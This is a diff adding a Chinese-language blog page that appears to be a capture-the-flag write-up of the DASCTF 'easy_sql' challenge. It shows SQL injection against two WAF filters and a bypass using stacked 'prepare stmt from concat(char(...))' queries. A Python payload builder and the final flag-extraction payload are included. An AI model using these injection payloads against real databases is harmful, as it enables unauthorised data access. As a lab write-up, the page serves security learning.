@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DASCTF easy_sql Writeup — SQL注入WAF绕过实战 — DARKSEC</title>
+<meta name="description" content="DASCTF easy_sql靶场实战：双重WAF绕过（preg_match关键字过滤+strstr组合过滤），prepare from concat(char())绕过select/where/.过滤，提取flag。">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/cat-final.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/cat-final.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/assets/images/cat-final.png">
+<link rel="shortcut icon" href="/assets/images/cat-final.png">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span> <img src="/assets/images/cat-final.png" alt="cat" style="width:28px;height:28px;vertical-align:middle;margin-left:4px;"></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ CTF / DASCTF / SQL注入</div>
+        <h1>DASCTF easy_sql — 双重WAF绕过SQL注入 🐱</h1>
+        <div class="article-meta">
+          <span>📅 2026-08-11</span>
+          <span>⏱ 10 min read</span>
+          <span>🏷 SQL注入 / WAF绕过 / CTF</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#overview">题目概览</a></li>
+            <li><a href="#recon">信息收集与注入点确认</a></li>
+            <li><a href="#waf">WAF分析：双重防护</a></li>
+            <li><a href="#bypass">绕过思路：prepare from concat(char())</a></li>
+            <li><a href="#exploit">数据提取与Flag获取</a></li>
+            <li><a href="#summary">总结</a></li>
+          </ul>
+        </div>
+
+        <h2 id="overview">🎯 题目概览</h2>
+        <p>DASCTF 的 <code>easy_sql</code> 靶场，基于真实环境渗透场景。PHP 7.3.10 + MariaDB 10.3.18，提示"sqlmap是没有灵魂的"——暗示需要手动注入。</p>
+        <pre><code>&lt;h1&gt;取材于某次真实环境渗透，只说一句话：开发和安全缺一不可&lt;/h1&gt;
+&lt;!-- sqlmap是没有灵魂的 --&gt;
+&lt;form method="get"&gt;
+    姿势: &lt;input type="text" name="inject" value="1"&gt;
+    &lt;input type="submit"&gt;
+&lt;/form&gt;</code></pre>
+        <p>一个GET参数 <code>inject</code>，默认值 <code>1</code>，输出在 <code>&lt;pre&gt;</code> 标签中以 <code>var_dump</code> 形式显示。</p>
+
+        <h2 id="recon">🔍 信息收集与注入点确认</h2>
+        <h3>基础测试</h3>
+        <p>输入 <code>1</code> 返回查询结果（数组），输入 <code>1'</code> 报 SQL 语法错误：</p>
+        <pre><code># 正常查询 → 返回 var_dump 结果
+inject=1  → array(2) { [0]=> string(1) "1" [1]=> string(7) "hahahah" }
+
+# 单引号触发SQL错误 → 确认字符串型注入
+inject=1' → error 1064 : ...near ''1''' at line 1
+
+# 布尔盲注验证
+inject=1' and '1'='1  → 有数据（True）
+inject=1' and '1'='2  → 无数据（False）</code></pre>
+        <p>确认为<strong>单引号字符串型注入</strong>，MariaDB 数据库。</p>
+
+        <h2 id="waf">🛡️ WAF分析：双重防护</h2>
+        <h3>第一层：preg_match 关键字过滤</h3>
+        <p>当输入包含 <code>select</code> 时，返回了源码泄露：</p>
+        <pre><code># 输入 union select 1 → 返回：
+return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);</code></pre>
+        <p>过滤的关键字：</p>
+        <table>
+          <tr><th>关键字</th><th>用途</th><th>影响</th></tr>
+          <tr><td><code>select</code></td><td>查询数据</td><td>无法直接查询</td></tr>
+          <tr><td><code>update</code></td><td>更新数据</td><td>无法更新</td></tr>
+          <tr><td><code>delete</code></td><td>删除数据</td><td>无法删除</td></tr>
+          <tr><td><code>drop</code></td><td>删除表</td><td>无法删表</td></tr>
+          <tr><td><code>insert</code></td><td>插入数据</td><td>无法插入</td></tr>
+          <tr><td><code>where</code></td><td>条件过滤</td><td>无法使用WHERE子句</td></tr>
+          <tr><td><code>.</code></td><td>点号（information_schema.tables）</td><td>无法直接引用跨库表</td></tr>
+        </table>
+        <p>注意：正则使用 <code>/i</code> 标志，<strong>大小写不敏感</strong>，无法用大小写绕过。</p>
+
+        <h3>第二层：strstr 组合过滤</h3>
+        <p>当同时包含 <code>set</code> 和 <code>prepare</code> 时：</p>
+        <pre><code># 输入 set @a=1;prepare... → 返回：
+strstr($inject, "set") && strstr($inject, "prepare")</code></pre>
+        <p>这层防护直接封杀了经典的 <code>SET @sql=...; PREPARE stmt FROM @sql; EXECUTE stmt;</code> 绕过方式。</p>
+
+        <blockquote>
+          <p>💡 两层WAF配合：第一层过滤SQL关键字，第二层封杀预编译绕过。需要找到一个既能避开关键字过滤、又不同时使用set+prepare的方法。</p>
+        </blockquote>
+
+        <h2 id="bypass">🔧 绕过思路：prepare from concat(char())</h2>
+        <h3>关键发现</h3>
+        <p>测试发现 <code>prepare</code> 和 <code>execute</code> 本身并不在过滤列表中！只有同时出现 <code>set</code>+<code>prepare</code> 才会被拦截。</p>
+        <p>MySQL的 <code>PREPARE</code> 语句支持直接从表达式准备：</p>
+        <pre><code>-- 经典方式（被拦截）：
+SET @sql = concat('sel','ect version()');
+PREPARE stmt FROM @sql;
+EXECUTE stmt;
+
+-- 绕过方式（可行）：
+PREPARE stmt FROM concat(char(115,101,108,101,99,116,32,118,101,114,115,105,111,110,40,41));
+EXECUTE stmt;
+-- 等价于：PREPARE stmt FROM 'select version()'</code></pre>
+
+        <h3>绕过原理</h3>
+        <ol>
+          <li><strong>不用 <code>set</code></strong> — <code>PREPARE stmt FROM expr</code> 直接接收表达式，不需要先赋值给变量</li>
+          <li><strong>用 <code>char()</code> 编码</strong> — 将整个SQL语句编码为ASCII数字，完全避开 <code>select</code>/<code>where</code>/<code>.</code> 等关键字</li>
+          <li><strong>用 <code>concat()</code> 拼接</strong> — 将多个 <code>char()</code> 段拼接成完整的SQL字符串</li>
+        </ol>
+
+        <h3>Payload构造工具</h3>
+        <pre><code>python3 -c "
+sql = 'select version()'
+chars = ','.join(str(ord(c)) for c in sql)
+print('1\\';prepare stmt from concat(char(' + chars + '));execute stmt;%23')
+"</code></pre>
+        <p>输出：</p>
+        <pre><code>1';prepare stmt from concat(char(115,101,108,101,99,116,32,118,101,114,115,105,111,110,40,41));execute stmt;%23</code></pre>
+        <p>整个payload中<strong>不包含任何被过滤的关键字和字符</strong>，WAF完全放行。</p>
+
+        <h2 id="exploit">🏴 数据提取与Flag获取</h2>
+        <h3>Step 1：版本和数据库</h3>
+        <pre><code># 版本 → 10.3.18-MariaDB
+# 数据库 → supersqli</code></pre>
+
+        <h3>Step 2：表名枚举</h3>
+        <pre><code># show tables
+# 结果：
+# 1919810931114514  ← 疑似flag表
+# words            ← 正常业务表</code></pre>
+
+        <h3>Step 3：列名查询</h3>
+        <pre><code># 查询 1919810931114514 表的列名
+# 用 char() 编码避免 . 和 where
+# 结果：flag</code></pre>
+        <p>表名以数字开头，直接使用会报语法错误，需要用反引号包裹。</p>
+
+        <h3>Step 4：提取Flag</h3>
+        <pre><code># select flag from `1919810931114514`
+# 反引号 ` = char(96)
+
+# 最终payload：
+1';prepare stmt from concat(char(
+  115,101,108,101,99,116,32,          -- "select "
+  102,108,97,103,32,                  -- "flag "
+  102,114,111,109,32,                 -- "from "
+  96,                                 -- "`"
+  49,57,49,57,56,49,48,57,51,49,49,49,52,53,49,52,  -- "1919810931114514"
+  96                                  -- "`"
+));execute stmt;%23</code></pre>
+
+        <div style="background:linear-gradient(135deg,rgba(0,240,255,0.05),rgba(255,45,120,0.05));border:1px solid rgba(0,240,255,0.2);border-radius:8px;padding:20px;margin:24px 0;text-align:center;">
+          <p style="font-size:0.85rem;color:var(--text);margin-bottom:8px;">// FLAG //</p>
+          <code style="font-size:1.2rem;color:var(--neon-cyan);letter-spacing:2px;">CTF2{d40b6c53-36ae-4b66-b0eb-5fb3c28156d4}</code>
+        </div>
+
+        <h2 id="summary">📊 总结</h2>
+        <h3>攻击链</h3>
+        <pre><code>单引号注入确认 → WAF分析（两层过滤）
+  → 发现 prepare/execute 未被单独过滤
+  → prepare from concat(char(...)) 绕过关键字过滤
+  → 只用 prepare 不用 set，绕过组合过滤
+  → show tables → 信息收集
+  → information_schema.columns → 列名获取
+  → select flag from `数字表名`（反引号绕过）→ Flag</code></pre>
+
+        <h3>关键技巧</h3>
+        <table>
+          <tr><th>技巧</th><th>说明</th></tr>
+          <tr><td><code>char()</code> 编码</td><td>将SQL关键字编码为ASCII数字，完全绕过正则匹配</td></tr>
+          <tr><td><code>PREPARE FROM expr</code></td><td>MySQL支持直接从表达式准备语句，无需SET变量</td></tr>
+          <tr><td>反引号包裹表名</td><td>数字开头的表名需要用反引号 <code>`</code> 转义</td></tr>
+          <tr><td>WAF源码泄露</td><td>过滤触发时返回PHP源码，直接暴露防护逻辑</td></tr>
+        </table>
+
+        <blockquote>
+          <p>💡 这道题的核心在于"开发和安全缺一不可"——WAF设计有两层防护，但 <code>PREPARE FROM expr</code> 这个语法特性绕过了所有过滤。安全开发不能只过滤关键字，还需要考虑SQL语法的多种写法。</p>
+        </blockquote>
+
+        <div class="article-tags">
+          <span class="tag pink">SQL注入</span>
+          <span class="tag">WAF绕过</span>
+          <span class="tag purple">CTF</span>
+          <span class="tag yellow">DASCTF</span>
+          <span class="tag cyan">prepare</span>
+          <span class="tag green">char编码</span>
+        </div>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <div style="text-align:center;margin-bottom:16px;">
+      <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+      <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+      <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+      <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+      <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+    </div>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> CYBERCAT SECURITY LAB <img src="/assets/images/cat-final.png" alt="cat" style="width:1.2em;height:1.2em;vertical-align:middle;"></p>
+      <p class="quote">「 漏洞不会消失，只会转移 nya~ 」</p>
+      <div class="links">
+        <a href="https://github.com/deft-dream" target="_blank">GitHub</a>
+        <span>·</span>
+        <a href="mailto:s815887892@163.com">Contact</a>
+      </div>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
